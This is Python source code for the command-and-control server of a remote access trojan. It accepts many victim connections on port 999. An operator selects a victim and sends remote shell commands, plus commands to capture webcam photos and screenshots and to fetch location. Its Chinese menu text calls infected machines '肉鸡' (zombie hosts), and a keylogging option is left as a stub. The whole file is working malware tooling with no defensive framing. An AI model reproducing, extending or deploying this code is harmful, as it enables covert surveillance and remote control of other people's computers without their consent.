from socket import *
import threading

clientList = []
curClient = None
quitThread = False
lock = threading.Lock()

def shell_ctrl(socket, addr):
    print("!photograph --> 摄像头照片")
    print("!screen --> 桌面照片")
    print("!keyboard --> 键盘监听")
    print("!location --> 获取肉鸡的地址位置")
    print("!select --> return to select")
    print("!quit --> exit")
    while True:
        clientIp = addr[0]
        com = input(str(addr[0]) + ':~#')
        if com == '!photograph':
            socket.send(com.encode('utf-8'))
            continue
        if com == '!screen':
            socket.send(com.encode('utf-8'))
            continue
        if com == '!keyboard':
            pass
        if com == '!location':
            socket.send(com.encode('utf-8'))
            data = socket.recv(2048)
            print(data.decode('utf-8'))
            data = socket.recv(2048)
            print(data.decode('utf-8'))
            data = socket.recv(2048)
            print(data.decode('utf-8'))
            continue

        if com == '!select':
            select_client()
            return
        if com == '!quit':
            quitThread = True
            print("------------------* Connection has ended *------------------")
            exit(0)
        socket.send(com.encode('utf-8'))
        data = socket.recv(2048)
        print(data.decode('utf-8'))

def select_client():
    global curClient
    global quitThread
    print("------------------* The current is connected to the client: *------------------")
    for i in range(len(clientList)):
        print('[%i] -> %s' %(i, str(clientList[i][1][0])))
    print('Please select a client!')

    while True:
        num = input('client num:')
        if int(num) >= len(clientList):
            print('Please input a correct num!')
            continue
        else:
            break

    curClient = clientList[int(num)]
    print('=' * 80)
    print(' ' * 20 + 'Client Shell from addr:',curClient[1][0])

def wait_connect(sk):
    global clientList
    while not quitThread:
        if len(clientList) == 0:
            print('Waiting for the connection...')
        sock, addr = sk.accept()
        print('New client %s is connection!' %(addr[0]))
        lock.acquire()
        clientList.append((sock, addr))
        lock.release()

def main():
    s = socket(AF_INET, SOCK_STREAM)
    s.bind(('0.0.0.0',999))
    s.listen(50)

    t = threading.Thread(target=wait_connect, args=(s,))
    t.start()

    while True:
        if len(clientList) > 0:
            select_client()
            shell_ctrl(curClient[0], curClient[1])


if __name__ == '__main__':
    main()